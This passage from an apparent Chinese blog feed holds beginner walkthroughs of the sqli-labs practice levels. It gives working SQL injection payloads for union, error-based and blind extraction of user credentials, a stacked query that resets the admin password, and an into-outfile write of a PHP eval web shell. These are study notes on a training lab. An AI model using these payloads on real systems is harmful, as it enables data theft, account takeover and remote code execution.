<li>此笔记为笔者初学sql注入时所写</li>
<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_36+37</title>
    <url>/2022/11/18/sqli-labs_36+37/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这关基本是在重复之前的注入方式</p>
<span id="more"></span>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li>
</ol>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>’</li>
<li>“</li>
<li>\x1a<br>那么直接用%df绕过</li>
</ul>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="第37关"><a href="#第37关" class="headerlink" title="第37关"></a>第37关</h1><p>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>毫无难度</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_42-45</title>
    <url>/2022/11/19/sqli-labs_42-45/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改管理员密码(可以直接做)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_46+47</title>
    <url>/2022/11/19/sqli-labs_46+47/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面连续几关相似，这一回终于有新内容了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure>
<p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure>
<p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入查询记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>
<p>用十六进制代替<?php phphinfo();?></p>
</li>
</ol>
<h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_5+6</title>
    <url>/2022/11/08/sqli-labs_5+6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
</li>
</ol>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
</li>
<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_48-53</title>
    <url>/2022/11/19/sqli-labs_48-53/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure>
<p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p>
<h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p>
<h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p>
<h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p>
<h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_54-57</title>
    <url>/2022/11/19/sqli-labs_54-57/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识基本都已经学完了，从这里开始就是训练了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>就像回到了开始~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure>
<p>推测闭合方式为’</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure>
<p>字段数为3</p>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第55关"><a href="#第55关" class="headerlink" title="第55关"></a>第55关</h2><p>与第54关差不多，闭合方式变更为)</p>
<h2 id="第56关"><a href="#第56关" class="headerlink" title="第56关"></a>第56关</h2><p>与第54关差不多，闭合方式变更为’)</p>
<h2 id="第57关"><a href="#第57关" class="headerlink" title="第57关"></a>第57关</h2><p>与第54关差不多，闭合方式变更为”</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>限制了次数的玩法还挺刺激的hh</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_58-65</title>
    <url>/2022/11/20/sqli-labs_58-65/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续挑战吧</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure>
<p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第59关"><a href="#第59关" class="headerlink" title="第59关"></a>第59关</h2><p>与第58关相比差不多，只是闭合方式没有单引号</p>
<h2 id="第60关"><a href="#第60关" class="headerlink" title="第60关"></a>第60关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p>
<h2 id="第61关"><a href="#第61关" class="headerlink" title="第61关"></a>第61关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p>
<h2 id="第62关"><a href="#第62关" class="headerlink" title="第62关"></a>第62关</h2><p>时间盲注，闭合方式’)</p>
<h2 id="第63关"><a href="#第63关" class="headerlink" title="第63关"></a>第63关</h2><p>时间盲注，闭合方式’</p>
<h2 id="第64关"><a href="#第64关" class="headerlink" title="第64关"></a>第64关</h2><p>时间盲注，闭合方式))</p>
<h2 id="第65关"><a href="#第65关" class="headerlink" title="第65关"></a>第65关</h2><p>时间盲注，闭合方式”)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还行</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_7</title>
    <url>/2022/11/08/sqli-labs_7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关耗费了我好几个小时，究其原因，是大多博客写得不清不楚，或者说自认为清楚，读者(我)却感到很迷惑。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’--+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))--+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p>
</li>
</ol>
<ul>
<li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li>
<li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li>
</ul>
<p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p>
<ul>
<li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li>
<li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>
secure_file_priv 一栏的value为空，即是成功</li>
</ul>
<p>之后就能愉快地获取库名和版本号了,示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure>

<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_33598708/article/details/124059514">sqli-labs第七关sql注入流程</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_8</title>
    <url>/2022/11/09/sqli-labs_8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
</li>
</ol>
<ul>
<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
说明数据库名长度为8</li>
<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
</ul>
<ol start="3">
<li><p><strong>爆表</strong><br>道理是类似的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
</li>
<li><p><strong>爆字段名</strong></p>
